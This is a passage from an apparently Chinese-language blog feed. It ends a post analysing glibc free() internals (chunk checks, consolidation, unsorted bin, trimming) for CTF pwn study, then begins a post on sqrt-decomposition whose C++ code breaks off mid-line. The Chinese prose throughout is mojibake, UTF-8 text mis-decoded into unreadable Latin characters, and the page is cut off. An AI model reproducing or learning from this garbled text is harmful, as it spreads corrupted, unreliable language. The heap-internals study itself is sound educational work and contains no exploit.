<code>top_chunk</code>çš„æ—¶å€™ï¼Œå°±ä¼šæŠ¥è¿™ä¸ªé”™ã€‚</p><p>ç¬¬äºŒä¸ª<code>check</code></p><ol><li><code>contiguous (av)</code>ï¼šæ£€æŸ¥åˆ†é…å™¨ä¸Šçš„<code>flags</code>ï¼Œå…¶å®æˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯å¹²å˜›çš„(æ‚è„¸ã€‚</li><li><code>(char *) nextchunk&gt;=(char *) av-&gt;top + chunksize(av-&gt;top)</code>ï¼šç„¶åè¿™ä¸ªæ¡ä»¶å‘¢å°±æ˜¯è¯´å¦‚æœæˆ‘è¿™ä¸ª<code>chunk</code>çš„ä¸‹ä¸€ä¸ª<code>chunk</code>å±…ç„¶åœ¨<code>top_chunk</code>ä¹‹åï¼Œé‚£è‚¯å®šå°±ä¹Ÿæœ‰é”™äº†ã€‚</li></ol><p>ç¬¬ä¸‰ä¸ª<code>check</code></p><ol><li><code>!prev_inuse(nextchunk)</code>ï¼šå°±æ˜¯è¯´å¦‚æœåä¸€ä¸ª<code>chunk</code>çš„<code>prev_inuse</code>ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ª<code>chunk</code>å¤„äºè¢«<code>free</code>çš„çŠ¶æ€ï¼Œé‚£ä¹ˆè¿™ä¸€æ¬¡<code>free</code>å°±æœ‰å¯èƒ½é€ æˆ<code>double free</code>äº†ï¼Œå°±ä¼šæŠ¥é”™ã€‚</li></ol><p>ç¬¬å››ä¸ª<code>check</code></p><ol><li><code>nextchunk-&gt;size &lt;= 2 * SIZE_SZ</code>ï¼šå¦‚æœä¸‹ä¸€ä¸ª<code>chunk</code>çš„<code>size</code>æœ‰é—®é¢˜ä¸€æ ·ä¹Ÿè¦æŠ¥é”™é€€å‡ºï¼Œè¿™é‡Œè¯´çš„å°±æ˜¯ä¸‹ä¸€ä¸ª<code>chunk</code>çš„<code>size</code>å°äº<code>MINSIZE</code>çš„æƒ…å†µï¼Œfreeçš„è¯å› ä¸ºä¼šæ¶‰åŠåˆ°chunkçš„å‘å‰åˆå¹¶æˆ–è€…å‘ååˆå¹¶ï¼Œå› æ­¤å¯¹å‰åå †å—çš„æ£€æŸ¥éƒ½å¾ˆä¸¥æ ¼ã€‚</li><li><code>nextsize &gt;= av-&gt;system_mem</code>ï¼š<code>size</code>è¶…å‡ºç³»ç»Ÿåˆ†é…ç»™åˆ†é…å™¨çš„å†…å­˜ï¼Œé‚£ä¹ŸæŠ¥é”™ã€‚</li></ol><h4 id="ç¬¬ä¸‰éƒ¨åˆ†ï¼šfreeä¹‹åå‘å‰åˆå¹¶"><a href="#ç¬¬ä¸‰éƒ¨åˆ†ï¼šfreeä¹‹åå‘å‰åˆå¹¶" class="headerlink" title="ç¬¬ä¸‰éƒ¨åˆ†ï¼šfreeä¹‹åå‘å‰åˆå¹¶"></a>ç¬¬ä¸‰éƒ¨åˆ†ï¼šfreeä¹‹åå‘å‰åˆå¹¶</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æåˆ°äº†æˆ‘ä»¬ä¹‹å‰è®²åˆ°çš„ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä¸€ä¸ªå †å—æ€ä¹ˆå‘å‰åˆå¹¶ï¼Œä¹Ÿå°±æ˜¯å¦‚ä½•å‡†ç¡®åœ°æ‰¾åˆ°å‰ä¸€ä¸ªå †å—ã€‚å‘å‰åˆå¹¶çš„æ—¶å€™æˆ‘å…ˆåˆ¤æ–­ä¸€ä¸‹å‰ä¸€ä¸ª<code>chunk</code>æ˜¯å¦è¢«ä½¿ç”¨ï¼Œå¦‚æœä¸è¢«ä½¿ç”¨é‚£ä¹ˆå°±è¦å’Œå‰é¢çš„<code>chunk</code>åˆå¹¶ã€‚è¿™é‡Œæˆ‘å°±å¯ä»¥é€šè¿‡<code>prev_size</code>ä½å»æ‰¾åˆ°è¿™ä¸ªå †å—ï¼Œç”¨è‡ªèº«æŒ‡é’ˆå‡å»<code>prev_size</code>å°±å¾—åˆ°äº†å‰ä¸€ä¸ª<code>chunk</code>çš„æŒ‡é’ˆã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œå› ä¸ºå‰é¢é‚£ä¸ª<code>chunk</code>å¯èƒ½åœ¨<code>large bin</code>,<code>small bin</code>æˆ–è€…æ˜¯<code>unsorted bin</code>çš„é“¾è¡¨å½“ä¸­ï¼Œé‚£ä¹ˆæˆ‘å°±å¾—å…ˆæŠŠå®ƒä»è¿™äº›<code>bin</code>é‡Œé¢è§£è„±å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯<code>unlink</code>æ“ä½œï¼Œåˆå¹¶ä¹‹åæˆä¸ºä¸€ä¸ªæ–°çš„<code>chunk</code>ç„¶åå†åŠ å…¥<code>unsorted bin</code>ã€‚</p><p>è¿™é‡Œå‘å‰åˆå¹¶çš„æ“ä½œå‘¢åº”è¯¥ä¹Ÿæ²¡æœ‰å¾ˆå¤æ‚ï¼Œå°±æ˜¯æ”¹ä¸ª<code>size</code>ç„¶åæŠŠ<code>free</code>çš„æŒ‡é’ˆæŒ‡åˆ°å‰é¢å»ï¼Œç›¸å½“äºæ˜¯è¦<code>free</code>åˆå¹¶åçš„<code>chunk</code>äº†ã€‚ç„¶å<code>unlink</code>æŠŠå‰é¢çš„<code>chunk</code>åœ¨<code>bin</code>ä¸­åˆ é™¤ã€‚</p><h4 id="ç¬¬å››éƒ¨åˆ†ï¼šfreeä¹‹åå‘ååˆå¹¶"><a href="#ç¬¬å››éƒ¨åˆ†ï¼šfreeä¹‹åå‘ååˆå¹¶" class="headerlink" title="ç¬¬å››éƒ¨åˆ†ï¼šfreeä¹‹åå‘ååˆå¹¶"></a>ç¬¬å››éƒ¨åˆ†ï¼šfreeä¹‹åå‘ååˆå¹¶</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate forward */</span></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">    not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">    been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">    bck = unsorted_chunks(av);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;fd = fwd;</span><br><span class="line">    p-&gt;bk = bck;</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    bck-&gt;fd = p;</span><br><span class="line">    fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    set_foot(p, size);</span><br><span class="line">    check_free_chunk(av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">    check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªç‰¹åˆ¤åé¢çš„<code>chunk</code>æ˜¯å¦ä¸º<code>top_chunk</code>ï¼Œ<code>top_chunk</code>çš„æƒ…å†µå°±éå¸¸ç®€å•ï¼Œå› ä¸ºåˆå¹¶çš„<code>chunk</code>å¹¶ä¸åœ¨ä»»ä½•<code>bin</code>é‡Œé¢ï¼Œ<code>top_chunk</code>åé¢ä¹Ÿæ²¡æœ‰å †å—ä¸éœ€è¦è®¾ç½®æ ‡å¿—ä½ã€‚åªéœ€è¦æ”¹ä¸€ä¸‹<code>top_chunk</code>çš„<code>size</code>ï¼Œç„¶åæ”¹ä¸€ä¸‹æŒ‡é’ˆï¼Œå°±å®Œäº†ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬åˆ†æä¸æ˜¯<code>top_chunk</code>çš„æƒ…å†µï¼Œé¦–å…ˆæˆ‘å…ˆè·å–ä¸€ä¸‹ä¸‹ä¸€ä¸ª<code>chunk</code>çš„æ˜¯å¦è¢«ä½¿ç”¨ï¼Œå¦‚æœæ²¡æœ‰è¢«ä½¿ç”¨ï¼Œé‚£ä¹ˆæŠŠåé¢çš„<code>chunk</code>å°±å…ˆ<code>unlink</code>äº†ï¼Œç„¶åè‡ªå·±<code>chunk</code>çš„<code>size</code>åŠ ä¸Šåé¢é‚£ä¸ª<code>chunk</code>çš„<code>size</code>æˆä¸ºæ–°çš„<code>chunk</code>ã€‚å¦åˆ™ï¼Œæˆ‘å°±ç›´æ¥æ¸…ç©ºåé¢<code>chunk</code>çš„<code>prev_inuse</code>ä½ï¼Œå°±æ˜¯è¡¨ç¤ºæˆ‘è¿™ä¸ª<code>chunk</code>å·²ç»ä¸è¢«ä½¿ç”¨äº†ã€‚å¥½äº†ä¹‹åé‚£å°±æ˜¯æŠŠè¿™ä¸ª<code>chunk</code>é“¾å…¥<code>unsorted bin</code>ã€‚è¿™é‡Œè¿˜æœ‰ä¸€ä¸ª<code>check</code>ï¼Œè·Ÿ<code>malloc</code>é‚£ä¸ªä¸€æ ·ï¼Œï¼Œåé¢åŸºæœ¬ä¹Ÿéƒ½ä¸€æ ·äº†ï¼Œå°±ä¸ç»†è®²äº†ï¼Œé“¾å…¥ï¼Œè®¾ç½®æ ‡è®°ä¸ºï¼Œè®¾ç½®<code>prev_size</code>ï¼Œå¦‚æœä¸åœ¨<code>small chunk</code>çš„å¤§å°è¿˜ä¼šæ¸…ç©º<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>æŒ‡é’ˆï¼Œå¦‚æœä¸ç†è§£å¯ä»¥å¾€ä¸Šç¿»ä¸€ä¸‹çœ‹çœ‹ã€‚ç›®å½•æ ‡é¢˜ä¸ºâ€œæœ€åä¸€å°å—â€ï¼Œé‚£è¾¹æ˜¯åˆ‡å‰²<code>bin</code>çš„æ—¶å€™è®¾ç½®çš„ã€‚</p><h4 id="ç¬¬äº”éƒ¨åˆ†ï¼šæœ€åçš„å¤„ç†"><a href="#ç¬¬äº”éƒ¨åˆ†ï¼šæœ€åçš„å¤„ç†" class="headerlink" title="ç¬¬äº”éƒ¨åˆ†ï¼šæœ€åçš„å¤„ç†"></a>ç¬¬äº”éƒ¨åˆ†ï¼šæœ€åçš„å¤„ç†</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">            systrim(mp_.top_pad, av);</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">       large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æ³¨é‡Šæ‰€è¯´ï¼Œå¦‚æœæˆ‘ä¸€æ¬¡é‡Šæ”¾äº†ä¸€ä¸ªå¾ˆå¤§çš„ç©ºé—´(<code>0x10000B</code>)ï¼Œé‚£ä¹ˆä¼šè°ƒç”¨<code>malloc_consolidate</code>åˆå¹¶æ‰€æœ‰<code>fast bin</code>ï¼Œå¦‚æœè¿›ç¨‹æ‰€åœ¨çš„åˆ†é…åŒºæ˜¯ä¸»åˆ†é…åŒºå¹¶ä¸”å¯ä»¥æ”¶ç¼©å†…å­˜çš„è¯ï¼Œå°±è°ƒç”¨<code>systrim</code>æ”¶ç¼©å†…å­˜ï¼Œå¦åˆ™å°±è·å¾—éä¸»åˆ†é…åŒºçš„<code>heap_info</code>æŒ‡é’ˆï¼Œè°ƒç”¨<code>heap_trim</code>æ”¶ç¼©<code>heap</code>ã€‚å› ä¸ºæˆ‘ä»¬è®¤ä¸ºä¸€æ¬¡<code>free</code>å¾ˆå¤§çš„ç©ºé—´é‚£ä¹ˆæ“ä½œç³»ç»Ÿå¯ä»¥é€‚å½“å›æ”¶ç‚¹å†…å­˜äº†ï¼Œå¤§ä¸äº†ç­‰ä½ ä¸å¤Ÿå°±å†åƒæˆ‘è¦å˜›ï¼Œèµ„æºçš„åˆç†é…ç½®ï¼Œå¾ˆåˆç†ã€‚</p><p>è‡³æ­¤ï¼Œ<code>free</code>éƒ¨åˆ†çš„æºç ä¹Ÿéƒ½åˆ†æå®Œå•¦ã€‚</p><h3 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å°±ä¸å‘<code>malloc</code>ä¸€æ ·æè¿°å…·ä½“æ­¥éª¤äº†ï¼Œå› ä¸ºæœ¬èº«é€»è¾‘æ²¡æœ‰å¾ˆå¤æ‚ã€‚ä¸»è¦å°±æ˜¯<code>free</code>é<code>fast bin chunk</code>çš„å‘å‰åˆå¹¶æˆ–è€…å‘ååˆå¹¶ã€‚</p><p><code>free</code>åœ¨<code>fast bin</code>èŒƒå›´å†…çš„<code>chunk</code>ï¼Œç›´æ¥å°†<code>chunk</code>é“¾å…¥<code>fast bin</code>ï¼Œ<code>free</code>é<code>fast bin</code>èŒƒå›´çš„<code>chunk</code>è§†å…·ä½“æƒ…å†µå‘å‰åˆå¹¶æˆ–è€…å‘ååˆå¹¶ç„¶ååŠ å…¥<code>unsorted bin</code>ï¼Œå¦‚æœä¸€æ¬¡<code>free</code>å¤ªå¤šçš„ç©ºé—´æœ‰å¯èƒ½ä¼šè¢«æ“ä½œç³»ç»Ÿå›æ”¶ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æºç åˆ†æä¹Ÿå°±å®Œç»“æ’’èŠ±äº†ï¼Œåç»­å¯èƒ½ä¼šå‡ºheapçš„å„ç§åˆ©ç”¨æ–¹å¼å’Œåˆ©ç”¨æ‰‹æ®µï¼Œæˆ–è€…å±€éƒ¨åˆ†æå…¶å®ƒç‰ˆæœ¬çš„libcã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆ†å—å…¥é—¨2</title>
      <link href="/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/"/>
      <url>/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/</url>
      
        <content type="html"><![CDATA[<p>è°¨ä»¥æ­¤æ–‡ï¼Œçºªå¿µæˆ‘é€å»çš„è¿™6ä¸ªå°æ—¶ã€‚åŸæœ¬æ˜¨å¤©å¼€å¼€å¿ƒå¿ƒå­¦å­¦åˆ†å—ï¼Œä½†æ˜¯å…¥é—¨2å°±å¡ä½äº†ï¼Œå¡åˆ°ç”Ÿæ´»éƒ½ä¸èƒ½è‡ªç†äº†ã€‚</p><span id="more"></span><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p><img src="/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/1.png" alt="1"></p><p>é¢˜ç›®æ„æ€è¿˜æ˜¯å¾ˆæ¸…æ™°çš„ã€‚è¦æ±‚åŒºé—´åŠ æ³•ï¼ŒåŒºé—´æŸ¥è¯¢ç¬¦åˆæ¡ä»¶çš„å€¼ã€‚è‡³äºåŠ æ³•å®Œå…¨å¯ä»¥ç…§æ¬å‰ä¸€é“é¢˜ç›®çš„æ–¹å¼ï¼Œä½†æ˜¯æŸ¥è¯¢çš„æ“ä½œç€å®æœ‰ç‚¹è€äººå¯»å‘³äº†ï¼Œå› ä¸ºåŒºé—´æŸ¥è¯¢æ„å‘³ç€æˆ‘ä»¬å¾—é‡‡ç”¨åˆ†å—çš„æ€æƒ³ï¼Œä¸èƒ½æš´åŠ›æ±‚è§£ã€‚é¦–å…ˆæˆ‘æƒ³åˆ°è®©æ¯ä¸€ä¸ªå—å˜å¾—æœ‰åºï¼Œç„¶ålower_boundæŸ¥åˆ°ç¬¬ä¸€ä¸ªå¤§äºç­‰äºæŸä¸ªå€¼çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„ä½ç½®ã€‚é¦–å…ˆå¯¹æ‰€æœ‰å—æ’åºçš„å¤æ‚åº¦ä¸ºâˆšn * âˆšn log_2(âˆšn)ä¹Ÿå°±æ˜¯nlog_2(n)çš„å¤æ‚åº¦ï¼Œç„¶åæ¯ä¸€æ¬¡æŸ¥è¯¢æœ€å¤šæ˜¯âˆšnçš„å¤æ‚åº¦ï¼Œæ¯ä¸€æ¬¡åŒºé—´åŠ æ³•æ˜¯âˆšnçš„å¤æ‚åº¦ï¼ŒåŒºé—´åŠ æ³•è¿˜è¦å¯¹å›ºå®šä¸¤ä¸ªæ®‹ç¼ºå—è¿›è¡Œé‡æ–°æ’åº(å› ä¸ºä¸¤è¾¹çš„æ®‹ç¼ºå—å¯èƒ½ä¼šç ´åæœ‰åºç»“æ„ï¼Œè€Œä¸­é—´çš„åˆ™ä¼šä¿æŒåŸæ¥çš„é¡ºåº)ï¼Œè¿™åˆéœ€è¦2âˆšnlog_2(âˆšn)çš„å¤æ‚åº¦ã€‚æŸ¥è¯¢å’ŒåŠ æ³•ä¸€èµ·æ˜¯nâˆšnçš„å¤æ‚åº¦ï¼Œæ‰€ä»¥æ•´ä¸ªç®—æ³•å°±æ˜¯nâˆšnçš„å¤æ‚åº¦ï¼Œç†è®ºå¯è¡Œä½†æ˜¯å®è·µå¯æƒ¨æ­»äº†ã€‚</p><p>é¦–å…ˆï¼Œåºåˆ—æ’åºç›´æ¥ç ´åäº†å®ƒçš„åºåˆ—ç»“æ„ï¼Œè¿™å¯¼è‡´æˆ‘åœ¨å‰ä¸€å¤©20ç‚¹-24ç‚¹çš„æäº¤ä¸€ç›´ä¸é€šè¿‡ã€‚åæ¥æˆ‘æ„è¯†åˆ°äº†ä¸èƒ½ç ´åå®ƒåŸæœ‰çš„åºåˆ—ï¼Œäºæ˜¯æƒ³åˆ°æ¯ä¸ªå—ç”¨ä¸€ä¸ªvectorå»ä¿å­˜ã€‚æ›´æ–°çš„æ—¶å€™clearå†ä¸€ä¸ªä¸ªpushç„¶åä¸€ä¸ªsortå³å¯ã€‚ç„¶ååˆä¸è¡Œï¼Œå‘ç°æ˜¯è¾¹ç•Œé—®é¢˜ï¼Œå› ä¸ºæˆ‘è¿‡äºè¿½æ±‚æé™ï¼Œå› æ­¤ä¼šåˆ¤æ–­ä¸¤è¾¹çš„å—æ˜¯å¦ä¸ºå®Œæ•´å—ï¼Œå®Œæ•´åˆ™ä¸€èµ·å¤„ç†ï¼Œä¸å®Œæ•´åˆ™å…ˆå¤„ç†ï¼Œè¿™æ ·å¯¼è‡´å¦‚æœæ²¡æœ‰å¤„ç†ï¼Œé‚£ä¹ˆä¸‹é¢çš„å¾ªç¯æ¡ä»¶æ²¡æ³¨æ„å°±ä¸ä¼šè¢«å¤„ç†äº†ã€‚æ‰€ä»¥æœ€å¥½çš„æ–¹æ³•å°±æ˜¯ï¼Œä¸ç®¡å®ƒï¼Œlé‚£ä¸ªç‚¹æ‰€åœ¨çš„å—æˆ‘å°±å…ˆå¤„ç†ï¼Œç®¡ä½ ç©ä¸å®Œæ•´çš„ï¼Œå³è¾¹çš„rä¹Ÿä¸€æ ·ã€‚</p><p>å¤„ç†å®Œäº†è¿™ä¸ªä¹‹åï¼Œæˆ‘åˆè¢«90åˆ†å¡ä½äº†ï¼Œæœ€åå‘ç°æ˜¯æœ€åä¸€ä¸ªä¸å®Œæ•´çš„å—å®ƒæ²¡æœ‰é¢„å…ˆæ’åºï¼Œä½†æ˜¯å…¶å®æ˜¯è¦çš„ï¼Œè™½ç„¶æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œå› ä¸ºæˆ‘å½“æ—¶æ˜¯æ„Ÿè§‰ï¼Œå®ƒä¸å¯èƒ½ä¼šè¢«å½“æˆä¸€ä¸ªå®Œæ•´çš„å—ï¼Œå°±åŸºæœ¬æ²¡å»ç®¡å®ƒäº†ã€‚ä½†æ˜¯äº‹å®å°±æ˜¯è¿™ä¹ˆé­”å¹»ï¼šä¸ç®¡æˆ‘å°±ä¸è®©ä½ è¿‡ï¼Œå°±æä½ å¿ƒæ€ã€‚</p><p>ç„¶åæ¥çœ‹çœ‹å­©å­çš„æäº¤è®°å½•å§ã€‚</p><p><img src="/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/2.png" alt="2"></p><p>çœŸçš„æ˜¯å¤ªä¸å®¹æ˜“äº†ï¼Œä¸‹é¢ç»™å‡ºæˆ‘çš„ACä»£ç ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 50005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],bl[maxn],tag[maxn],block,n;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;v[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    v[x].<span class="built_in">clear</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x*block;i&lt;<span class="built_in">min</span>((x+<span class="number">1</span>)*block,n);i++)&#123;</span><br><span class="line">        v[x].<span class="built_in">push_back</span>(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(v[x].<span class="built_in">begin</span>(),v[x].<span class="built_in">end</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=<span class="built_in">min</span>(bl[l]*block+block<span 